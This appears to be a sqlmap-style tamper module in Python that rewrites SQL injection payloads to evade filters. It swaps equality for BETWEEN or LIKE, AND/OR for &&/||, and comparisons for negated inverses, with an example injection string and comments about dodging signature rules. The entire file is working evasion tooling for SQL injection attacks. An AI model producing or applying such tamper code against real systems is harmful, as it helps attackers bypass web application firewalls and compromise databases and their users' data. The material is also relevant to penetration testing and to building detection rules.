import re

__example_payload__ = "' AND 1=1 OR 2>1--"
__type__ = "swap SQL comparison and boolean operators for semantically equivalent alternates"
__category__ = "sqli"
__chain_stage__ = "lexical"
__contexts__ = ("query", "form")

_NUMERIC = re.compile(r"^-?\d+(?:\.\d+)?$")
_EQUALS = re.compile(r"(?P<left>[^<>=!\s]+)\s*=\s*(?P<right>[^<>=!\s]+)")
_GREATER = re.compile(r"(?P<left>[^<>=!\s]+)\s*>\s*(?P<right>[^<>=!\s]+)")
_LESS = re.compile(r"(?P<left>[^<>=!\s]+)\s*<\s*(?P<right>[^<>=!\s]+)")


def _equals_alternate(match):
    left, right = match.group("left").strip(), match.group("right").strip()
    if _NUMERIC.match(left) and _NUMERIC.match(right):
        # 1=1 -> 1 BETWEEN 1 AND 1, dodges "x=y" signature matching
        return "{} BETWEEN {} AND {}".format(left, right, right)
    # string-ish comparison: 'a'='a' -> 'a' LIKE 'a'
    return "{} LIKE {}".format(left, right)


def _boolean_symbolic(payload):
    # AND/OR -> && / || (MySQL boolean operators, often overlooked by rulesets)
    retval = re.sub(r"\bAND\b", "&&", payload, flags=re.IGNORECASE)
    return re.sub(r"\bOR\b", "||", retval, flags=re.IGNORECASE)


def _greater_inverse(match):
    # a > b -> NOT (a <= b)
    return "NOT ({} <= {})".format(match.group("left").strip(), match.group("right").strip())


def _less_inverse(match):
    # a < b -> NOT (a >= b)
    return "NOT ({} >= {})".format(match.group("left").strip(), match.group("right").strip())


def tamper(payload, **kwargs):
    if not payload:
        return payload

    strategy = kwargs.get("strategy", -1)
    if strategy == -1:
        import random
        strategy = random.randrange(4)

    if strategy == 0:
        return _EQUALS.sub(_equals_alternate, payload)
    if strategy == 1:
        return _boolean_symbolic(payload)
    if strategy == 2:
        retval = _GREATER.sub(_greater_inverse, payload)
        return _LESS.sub(_less_inverse, retval)
    # strategy 3: combine equality and boolean swaps. Apply the boolean swap
    # first so the literal AND introduced by BETWEEN ... AND survives.
    retval = _boolean_symbolic(payload)
    return _EQUALS.sub(_equals_alternate, retval)
